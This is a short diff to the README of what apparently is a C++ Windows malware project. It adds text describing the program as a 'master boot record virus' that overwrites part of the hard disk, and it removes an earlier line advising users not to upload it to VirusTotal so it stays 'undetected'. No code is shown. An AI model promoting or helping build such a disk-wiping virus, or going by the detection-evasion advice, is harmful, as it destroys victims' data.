@@ -1,4 +1,7 @@
-# Infos
-[![C++](https://img.shields.io/badge/language-C%2B%2B-%23f34b7d.svg?style=plastic)](https://en.wikipedia.org/wiki/C%2B%2B)
+[![C++](https://img.shields.io/badge/language-C%2B%2B-%23f34b7d.svg?style=plastic)](https://en.wikipedia.org/wiki/C%2B%2B) 
+[![Windows](https://img.shields.io/badge/platform-Windows-0078d7.svg?style=plastic)](https://en.wikipedia.org/wiki/Microsoft_Windows) 
 
-## if you want to keep it as "undetected" dont upload it on virustotal etc..
+``` 
+> simply overwrite section of hdd 
+> master boot record virus
+``` 
